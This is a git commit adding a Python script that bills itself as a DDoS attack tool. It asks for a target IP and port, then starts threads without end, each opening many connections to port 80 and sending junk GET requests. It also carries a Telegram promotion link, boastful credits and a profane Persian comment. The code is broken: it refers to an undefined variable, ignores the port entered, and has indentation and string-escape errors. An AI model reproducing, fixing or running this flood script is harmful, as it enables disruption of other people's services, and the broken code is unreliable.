d8641fa80e8a3a3cebe8089bf3d5a51ed945af47
creatorofSatan <162295257+creatorofSatan@users.noreply.github.com>
2024-03-27 20:35:16 -0700

    Add files via upload

---
+++ tapri.py.py
@@ -0,0 +1,52 @@
+from colorama import Fore,init
+init()
+print(Fore.YELLOW+"      DDOS ATATK DDOS")
+
+
+
+print(Fore.GREEN+"""
+
+⠀/^^     /^^      /^           /^^   /^^   /^^
+/^^     /^^     /^ ^^      /^^   /^^ /^^  /^^
+/^^     /^^    /^  /^^    /^^        /^^ /^^
+/^^^^^^ /^^   /^^   /^^   /^^        /^ /^
+/^^     /^^  /^^^^^^ /^^  /^^        /^^  /^^
+/^^     /^^ /^^       /^^  /^^   /^^ /^^   /^^
+/^^     /^^/^^         /^^   /^^^^   /^^     /^^
+
+""")
+from colorama import Fore,init
+init()
+print(Fore.BLUE+"  https://t.me/+IhYRjAp_0NAzYTc0 ")
+
+
+
+print(Fore.RED+"""
+                 Script written by""")
+ print(Fore.BLUE+"                 creator of Satan \n FBI cyber government leader \N https://t.me/+IhYRjAp_0NAzYTc0")
+from colorama import Fore,init
+init()
+print(Fore.LIGHTWHITE_EX+"" )
+NAME =input('         ›››IP : ' )
+print('')
+name =input('     ATATK   PORT: ' )
+print('')
+from colorama import Fore,init
+init()
+print(Fore.LIGHTRED_EX+"")
+from socket import *
+import time
+import threading
+def main():
+    for i in range(1, 1000):
+        s = socket(AF_INET , SOCK_STREAM)
+        s.connect((u , 80))
+        pack = b"A"*100
+        request = "GET / HTTP 1.1\r\n".encode() + pack
+        print("send")
+        s.send(request)
+
+while True:
+    t = threading.Thread(target=main)
+    t.start()
+#کص مادرت اسکی بری خالق شیطانم
